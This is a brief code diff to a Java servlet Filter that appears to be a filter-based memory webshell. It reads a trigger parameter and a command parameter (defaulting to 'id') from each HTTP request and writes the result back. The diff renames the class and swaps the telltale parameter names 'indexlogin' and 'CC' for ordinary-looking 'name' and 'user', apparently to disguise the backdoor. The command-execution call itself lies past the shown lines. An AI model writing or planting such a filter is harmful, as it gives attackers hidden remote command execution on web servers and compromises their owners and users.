@@ -14,12 +14,12 @@ import java.util.EnumSet;
 import java.util.Optional;
 import java.util.UUID;
 
-public class FilterMem implements Filter {
+public class CommandExecFilter implements Filter {
 
     @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
-        boolean success = request.getParameter("indexlogin") != null;
-        String cmd = Optional.ofNullable(request.getParameter("CC")).orElse("id");
+        boolean success = request.getParameter("name") != null;
+        String cmd = Optional.ofNullable(request.getParameter("user")).orElse("id");
 
         if (success) {
             PrintWriter writer = response.getWriter();
